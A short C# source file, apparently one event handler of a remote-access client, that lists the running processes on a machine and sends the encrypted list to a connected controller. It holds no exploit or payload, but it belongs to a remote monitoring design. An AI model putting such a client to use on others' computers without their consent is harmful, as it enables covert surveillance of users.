using Client.Core.Networking;
using Client.Core.Security;
using Newtonsoft.Json;
using Shared;
using Shared.Helper;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Client.Core.Events
{
    class GetProcess
    {
        public static void Execute(string data)
        {
            List<DataProcess> processList = new List<DataProcess>();

            for (int i = 0; i < Process.GetProcesses().Length; i++)
            {
                processList.Add(new DataProcess()
                {
                    Id = Process.GetProcesses()[i].Id,
                    Name = Process.GetProcesses()[i].ProcessName + ".exe",
                    WindowTitle = Process.GetProcesses()[i].MainWindowTitle
                });
            }


            if (NetworkManager.IsConnected)
            {
                NetworkManager.Connection.SendObject("1x03", Cryptography.Encrypt(JsonConvert.SerializeObject(processList)));
            }
            else
            {
                //TODO, Buffer / Packet queue of some sort
            }
        }
    }
}
